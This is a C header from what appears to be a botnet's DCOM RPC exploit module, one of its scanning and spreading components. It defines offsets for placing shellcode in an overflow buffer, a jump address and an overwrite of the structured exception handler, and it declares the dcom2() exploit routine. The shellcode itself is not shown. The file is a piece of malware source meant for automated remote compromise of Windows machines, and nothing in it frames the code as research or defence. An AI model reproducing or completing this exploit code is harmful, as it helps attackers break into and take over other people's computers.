#ifndef NO_DCOM2
	#include "main.h"
	#include "advscan/defines.h"
	#include "advscan/advscan.h"
#define DCOM2_SCBUF_OFFSET_SC		0x24	// Offset for shellcode in the buffer
#define DCOM2_SCBUF_BUF_MAX			0x208	// Maximimum number of bytes in shellcode
#define DCOM2_SCBUF_OFFSET_JMP_ADDR	DCOM2_SCBUF_BUF_MAX+DCOM2_SCBUF_OFFSET_SC+0x8
											// Offset for the jump address
#define DCOM2_SCBUF_OFFSET_TOP_SEH	DCOM2_SCBUF_OFFSET_JMP_ADDR+0x4
											// Offset for the top of the structured
											// exception handler

typedef struct dcom2_offset_s
{	
	unsigned long lTopSEH;
	unsigned long lJmpAddr;

} dcom2_offset;

BOOL dcom2(EXINFO einfo);
#endif